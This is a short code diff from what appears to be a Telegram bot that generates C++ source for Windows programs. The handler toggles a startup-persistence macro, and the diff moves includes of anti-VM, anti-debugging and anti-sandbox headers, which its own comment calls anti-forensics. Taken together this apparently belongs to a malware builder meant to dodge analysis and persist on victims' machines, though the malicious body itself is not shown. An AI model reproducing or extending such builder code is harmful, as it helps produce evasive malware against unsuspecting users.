@@ -417,15 +417,17 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         startup_macro = "#define StartUP true" if startup else "#define StartUP false"
 
         cpp_template = f'''
+// Anti-forensics headers. anti_vm.h must be first to ensure winsock2.h is included before windows.h
+#include "anti_vm.h"
+#include "anti_debug.h"
+#include "anti_sandbox.h"
+
 #include <windows.h>
 #include <iostream>
 #include <vector>
 #include <string>
 #include <tlhelp32.h>
 #include <stdlib.h>
-#include "anti_debug.h"
-#include "anti_sandbox.h"
-#include "anti_vm.h"
 
 {startup_macro}
 
